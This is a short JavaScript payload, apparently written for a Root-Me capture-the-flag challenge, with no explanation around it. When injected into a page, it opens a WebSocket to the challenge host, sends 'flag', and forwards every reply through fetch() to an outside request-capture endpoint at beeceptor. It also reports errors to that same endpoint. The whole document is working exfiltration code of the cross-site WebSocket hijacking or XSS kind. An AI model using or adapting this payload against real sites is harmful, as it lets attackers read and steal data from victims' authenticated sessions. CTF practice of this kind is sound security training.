<script>
var ws = new WebSocket("ws://ctf15.root-me.org/ws"); // example path

ws.onopen = function () {
    ws.send("flag");
};

ws.onmessage = function (event) {
    var data = encodeURIComponent(event.data);
    fetch("https://toitoise.free.beeceptor.com/?c=" + data);
};

ws.onerror = function (e) {
    fetch("https://toitoise.free.beeceptor.com/?err=ws_error");
};
</script>
